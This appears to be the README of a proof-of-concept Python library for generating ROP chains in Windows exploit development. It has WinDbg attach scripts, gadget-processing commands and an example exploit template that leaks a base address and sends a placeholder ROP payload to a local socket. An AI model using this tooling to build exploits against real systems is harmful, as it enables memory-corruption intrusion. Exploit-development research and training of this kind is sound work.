# ropchain-generator



Some notes;
* The ropchain_generator has no implementation to check for bad bytes, this is up to the user. My thought to fix this, is exporting every address as a list instead of a string, and implement something that it loops through all addresses untill there are no bad bytes. This is not implemented yet.
* We can use this to generate generic ropchains which are compatible with other exploits, this will make codereuse possible if point one is fixed.
* It is a POC code, not the best written.
* I've not kept security in mind, but it should be relative save to run this package, because it doesn't use any external resources except pwntools, and Keystone-engine.


Todo:

- [ ] make better documentation
- [ ] making tests.
- [ ] make ropchain_generator export rpp_<binname><extension>_processed.txt with multiple addresses so bad bytes are filtered at runtime


watch.bat
```cmd
@ECHO OFF
:loop
  ::python .\register_sorter.py
  %*
  ::timeout /t -1 > NUL
  echo looping
goto loop
```

startup_attach.ps1

```powershell
# task to execute(could differ over time)
$specific_task="<bin name>"
$specific_task_dir="C:\path\to\executable\"
$custom_startup_script="path\to\custom\windbg.wds"

# scripts
$scripts_dir="scripts"
$script_file="main_caller\startup-script.wds" # this file i use for all debugging projects
$windbg="C:\Program Files\Windows Kits\10\Debuggers\x86"
# $windbg="C:\Users\deadbeef\AppData\Local\Microsoft\WindowsApps\WinDbgX.exe" # uncomment if you want to use the WinDbg Preview
$script_location="$share_location\$scripts_dir\$script_file"
$custom_script_location="C:\path\to\your\custom\windbg.wds"

$Process = [Diagnostics.Process]::Start("$specific_task_dir\$specific_task.exe")
$id = $Process.Id
$id = Get-Process $specific_task | Select -expand ID

$symbols="srv*C:\Symbols*;srv*c:\symbols"
$symbols="$symbols;cache*c:\symbolcache"
# $symbols="$symbols;srv*http://msdl.microsoft.com/download/symbols"
$workspace=""
# $workspace="$share_location\workspaces\custom_workspace_dark_with_fibo3.WEW"


& "$windbg" -c ".sympath $symbols" $workspace -c "`$`$>a<$script_location" -c "`$`$>a<$custom_script_location" -p $id
```

Example ropchain (exploit.py):

```python
#!/usr/bin/env python3
import ropchain_generator
from pwn import *

helper_functions = ropchain_generator.HelperFunctions()

def calc_hash(payload:bytes):
    retval = 0
    for i in range(0, len(payload),4):
        retval = helper_functions.calculate_addition(i, retval)
    return retval

def build_payload(main_payload_struct:struct, offset_hash:int):
    payload = flat(
        main_payload_struct,
        length=size_of_payload,
        # filler = b'\xcc'
    )

    main_payload_struct[offset_hash] = calc_hash(payload)
    payload = flat(
        main_payload_struct,
        length=size_of_payload,
        # filler = b'\xcc'
    )
    return payload


def send_payload(payload:bytes, ip="127.0.0.1", port=4444, recv_out=False):
    
    # print(header)
    with remote(ip, port) as conn:
        # conn.sendline(payload)
        conn.write(payload)
        retval = b""
        if recv_out:
            retval += conn.read(size_of_payload, timeout=5.5)

        return retval

size_of_payload = 0x200

gadget_file = 'rpp_<binname><extension>_processed.txt'
default_offset = 0xffff0000 # lm m <binaname> then caclulate the offsets that are in the gadget_file


main_payload_struct = {
    0x10: p32(0x29) # will be overwritten with the calchash function
}

base_pointer_binary = send_payload(build_payload(main_payload_struct, offset_hash=0))
base_pointer_binary_int = struct.unpack("<I", base_pointer_binary) 

rg_binary = ropchain_generator.RopChainGenerator(
    gadget_file=gadget_file,  
    check_gadgets=True, 
    check_gadgets_ks=True, 
    comment_failed_gadgets=False,
    offset_library=base_pointer_binary - default_offset
)
crcgo = rg_binary
payload = b""
payload += crcgo.set_instruction("xor eax,eax;ret")
payload += crcgo.set_instruction("pop esp;ret")
payload += crcgo.set_data(0xdeadbeef)

main_payload_struct = {
    0x10: p32(0x1),
    0x50: payload
}

send_payload(build_payload(main_payload_struct, offset_hash=8)) 
```


```ps1
cd C:\path\to\your\project\
&"C:\path\to\rp-win-x86.exe" -f "C:\path\to\the\exe\that\you\want\to\analyse\<binname>.<extension>" -r 5 > rpp_<binname>_output.txt
python3 -c 'import ropchain_generator;helper_functions = ropchain_generator.HelperFunctions();a = ropchain_generator.GadgetProcessor(r"""rpp_<binname><extension>_output.txt""");a.write_output(r"""rpp_processed_output.txt""")'
# this will genenerate:
#rpp_<binname><extension>_output.txt
#rpp_<binname><extension>_processed.txt
#rpp_<binname>_classified.<extension>_processed_classified.txt
```


```python
import ropchain_generator
helper_functions = ropchain_generator.HelperFunctions()
a = ropchain_generator.GadgetProcessor(r'C:\path\to\gadgets_plus_plus_output.out')
a.get_gadgets_as_dict()
```

```
a = ropchain_generator.GadgetFinder({'xor eax, eax;ret': 1})
a.get_good_registers()
Processing S-tier
Processing A-tier
Processing B-tier
Processing C-tier
Processing D-tier
Processing E-tier
Processing F-tier
```

This gives the following object:

```
{'S-tier xor ((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip), ((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip);ret(n 0x[0]+)?$': ['xor eax, eax;ret'],
 'A-tier xor ((((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+)|\\d+), ((((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+)|\\d+);ret(n 0x[0]+)?$': ['xor eax, eax;ret'],
 'B-tier xor ((((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+)|\\d+), ((((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+)|\\d+);ret(n 0x[a-fA-F\\d]+)?$': ['xor eax, eax;ret'],
 'C-tier xor (((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+), (((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+).*ret(n 0x[a-fA-F\\d]+)?$': ['xor eax, eax;ret'],
 'D-tier xor (((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+), (((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+).*': ['xor eax, eax;ret'],
 'E-tier xor .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+), .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+).*': ['xor eax, eax;ret'],
 'F-tier .*xor .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+), .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+).*': ['xor eax, eax;ret'],
 'F-tier .*or .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+), .*(((qword|dword|word|byte)\\s*\\[)?((r|e)?ax|a[l|h]|(r|e)?bx|b[l|h]|(r|e)?cx|c[l|h]|(r|e)?dx|d[l|h]|(r|e)?si|sil|(r|e)?di|dil|(r|e)?bp|bpl|(r|e)?sp|spl|[cdefgs]s|cr[0-8]|dr[0-7]|st\\([0-7]\\)|mm[0-7]|xmm[0-2]?[0-9]|xmm3[01]|ymm[0-2]?[0-9]|ymm3[01]|zmm[0-2]?[0-9]|zmm3[01]|r(3[01]|[12][0-9]|[89])[dwb]?(r|e)?ip)[\\da-fA-F+-x]*(\\])?|0x[a-fA-F\\d]+).*': ['xor eax, eax;ret']}
```


